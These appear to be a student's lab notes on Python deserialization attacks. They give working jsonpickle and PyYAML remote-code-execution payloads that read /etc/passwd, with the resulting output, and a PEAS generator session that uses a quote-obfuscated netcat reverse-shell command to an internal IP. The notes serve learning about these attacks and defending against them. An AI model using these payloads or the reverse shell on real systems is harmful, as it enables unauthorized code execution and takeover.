# Tools of the Trade (Python Deserialization)

## **JSONPickle**

Essentially the same thing

```python
import jsonpickle
import os

class RCE():
  def __reduce__(self):
    return os.system, ("head /etc/passwd",)

# Serialize (generate payload)
exploit = jsonpickle.encode(RCE())
print(exploit)

# Deserialize (vulnerable code)
jsonpickle.decode(exploit)
```

Some good content covering attacks for `JSONPickle` and `Pickle` are:

- [https://davidhamann.de/2020/04/05/exploiting-python-pickle/](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)
- [https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/](https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/)

## **YAML (PyYAML, ruamel.yaml)**

These libraries serialize data into [YAML](https://yaml.org/) format. Once again, we can serialize an object with a `__reduce__` function to get command execution. The serialized data will be in YAML format this time. [Ruamel.yaml](https://pypi.org/project/ruamel.yaml/) is based on [PyYAML](https://pyyaml.org/), so the same attack technique works for both:

```python
import yaml
import subprocess

class RCE():
  def __reduce__(self):
    return subprocess.Popen(["head", "/etc/passwd"])

# Serialize (Create the payload)
exploit = yaml.dump(RCE())
print(exploit)

# Deserialize (vulnerable code)
yaml.load(exploit)
```

Running the example script will demonstrate command execution. There is a long error message. However, the command is still run, so our goal is met.

```bash
python3 yaml-example.py Traceback (most recent call last):
  File "/home/kali/Pen/htb/academy/work/Introduction-to-Deserialization-Attacks/3-Exploiting-Python-Deserialization/yaml-example.py", line 11, in <module>
    exploit = yaml.dump(RCE())
  File "/home/kali/.local/lib/python3.10/site-packages/yaml/__init__.py", line 290, in dump
    return dump_all([data], stream, Dumper=Dumper, **kwds)
  File "/home/kali/.local/lib/python3.10/site-packages/yaml/__init__.py", line 278, in dump_all
    dumper.represent(data)
  File "/home/kali/.local/lib/python3.10/site-packages/yaml/representer.py", line 27, in represent
    node = self.represent_data(data)
  File "/home/kali/.local/lib/python3.10/site-packages/yaml/representer.py", line 52, in represent_data
    node = self.yaml_multi_representers[data_type](self, data)
  File "/home/kali/.local/lib/python3.10/site-packages/yaml/representer.py", line 322, in represent_object
    reduce = (list(reduce)+[None]*5)[:5]
TypeError: 'Popen' object is not iterable
root:x:0:0:root:/root:/usr/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
```

For further information, I recommend checking out the following links:

- [https://net-square.com/yaml-deserialization-attack-in-python.html](https://net-square.com/yaml-deserialization-attack-in-python.html)
- [https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf](https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf)

## **PEAS**

[PEAS](https://github.com/j0lt-github/python-deserialization-attack-payload-generator) is a multi-tool which can generate Python deserialization payloads for `Pickle`, `JSONPickle`, `PyYAML` and `ruamel.yaml`

```bash
git clone https://github.com/j0lt-github/python-deserialization-attack-payload-generator.git

cd python-deserialization-attack-payload-generator/
pip3 install -r requirements.txt 

python3 peas.py 
Enter RCE command :n''c -nv 172.17.0.1 9999 -e /bin/s''h
Enter operating system of target [linux/windows] . Default is linux :linux
Want to base64 encode payload ? [N/y] :
Enter File location and name to save :/tmp/payload                                                                                                                                           
Select Module (Pickle, PyYAML, jsonpickle, ruamel.yaml, All) :pickle
Done Saving file !!!!
```

> We would need to make a couple of modifications to this tool for it to actually work (in this scenario) since it uses the blocked `subprocess.open`
>